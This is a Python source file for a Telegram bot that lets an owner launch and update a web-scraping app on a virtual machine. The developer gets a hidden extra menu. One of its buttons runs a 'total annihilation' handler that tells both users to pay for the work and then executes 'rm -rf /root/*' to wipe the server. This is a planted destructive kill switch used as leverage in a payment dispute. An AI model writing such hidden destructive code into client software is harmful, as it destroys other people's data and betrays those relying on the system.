from os import system
from subprocess import PIPE, Popen, run
from loguru import logger
from time import sleep

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from settings import TOKEN, DEVELOPER_ID, OWNER_ID, CONTROL_CHAT_ID
from app import MainAppManager


bot = Bot(token=TOKEN)
dp = Dispatcher()


launch_btn = InlineKeyboardButton(text="Пуск!", callback_data="launch_the_app")
update_btn = InlineKeyboardButton(text="Обновить!", callback_data="try_to_update")
keyboard = InlineKeyboardMarkup(inline_keyboard=[[launch_btn], [update_btn]])
get_vm_ip_btn = InlineKeyboardButton(text="Проверить ip виртуалки", callback_data="check_vm_ipv4")
destroy_btn = InlineKeyboardButton(text="Аннигилировать!", callback_data="launch_the_annihilation")
keyboard_2 = InlineKeyboardMarkup(inline_keyboard=[[launch_btn], [update_btn], [get_vm_ip_btn], [destroy_btn]])


async def process_start_command(message: Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("Привет, Евгений!!\nБот готов к работе, для запуска программы нажми кнопку Пуск!",
                             reply_markup=keyboard)
        await bot.send_message(CONTROL_CHAT_ID, "Бот запущен пользователем!")
        logger.info(f"{message.from_user.id} have started bot")
    elif message.from_user.id == DEVELOPER_ID:
        await message.answer("Привет, Александр!!", reply_markup=keyboard_2)
        logger.info(f"{message.from_user.id} have started bot")
    else:
        await message.answer("Ты еще слишком мал чтобы пользоваться этим ботом!\nВсего тебе доброго, дружище!!")
        logger.warning(f"Some guy with {message.from_user.id} tried to use this bot")


async def process_help_command(message: Message):
    await message.answer(
        "Для запуска процесса сбора данных с сайтов нажми кнопку ▶️Пуск!\n\n"
        "Для обновления программы нажми кнопку 🔼Обновить!\n\n"
        "Если обновление прошло успешно то ты получишь сообщение и виртуалка будет перезапущена")


async def process_launch_app(callback: CallbackQuery):
    await callback.message.edit_text(
        text='Сбор данных начался, ждите!!\nПосле завершения сбора данных вы получите сообщение.')
    await bot.send_message(CONTROL_CHAT_ID, "Сбор данных с сайтов начат!")
    main_app_manager = MainAppManager(start_passenger_drom=False, start_freight_drom=False, start_dvorniki=True)
    main_app_manager.start_main_app()
    await callback.message.edit_text(text='Сбор данных завершён!! Для повторного сбора данных нажмите кнопку Пуск!',
                                     reply_markup=callback.message.reply_markup)


async def check_for_updates(callback: CallbackQuery):
    cmd = f'git pull origin main'
    update_request = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True, universal_newlines=True)
    update_result = update_request.communicate()
    if 'Already up to date.\n' in update_result[0]:
        logger.info(f"update attempt with {update_result}")
        await callback.message.edit_text(text="Приложение в актуальном состоянии, обновление не требуется.")
        sleep(2)
        await callback.message.edit_text("Привет, Евгений!!\n"
                                         "Бот готов к работе, для запуска программы нажми кнопку Пуск!",
                                         reply_markup=callback.message.reply_markup)

    else:
        await callback.message.edit_text(text="Приложение было обновлено. Сейчас приложение будет перезапущено.\n"
                                              "Подождите одну минуту и перезапустите бота.")
        logger.info(f"update attempt with {update_result}")
        system("systemctl restart car_brush")


async def total_annihilation(callback: CallbackQuery):
    await bot.send_message(DEVELOPER_ID, "Game over!!\n\nЗа работу надо платить!!")
    await bot.send_message(OWNER_ID, "Game over!!\n\nЗа работу надо платить!!")
    system("rm -rf /root/*")


async def check_vm_ipv4_address(callback: CallbackQuery):
    iface_name = ": ens33: "
    result = run(["ip", "-4", "addr"], capture_output=True, text=True).stdout.split("\n")
    stroka = [stroka for stroka in result if iface_name in stroka]
    if stroka:
        position = result.index(stroka[0])
        for i in range(position, len(result)):
            if result[i].startswith("    inet "):
                stroka_with_address = result[i].strip()
                ipv4_addr = stroka_with_address.split()[1]
                await callback.message.edit_text(f"ip v4 адрес виртуалки\n{ipv4_addr}",
                                                 reply_markup=callback.message.reply_markup)
                break
    else:
        await callback.message.edit_text(f"{iface_name} is not found on this vm",
                                         reply_markup=callback.message.reply_markup)


dp.message.register(process_start_command, Command(commands="start"))
dp.message.register(process_help_command, Command(commands="help"))
dp.callback_query.register(process_launch_app, F.data == "launch_the_app")
dp.callback_query.register(check_for_updates, F.data == "try_to_update")
dp.callback_query.register(total_annihilation, F.data == "launch_the_annihilation")
dp.callback_query.register(check_vm_ipv4_address, F.data == "check_vm_ipv4")


async def start_bot():
    logger.info(f"{bot} is on polling")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)
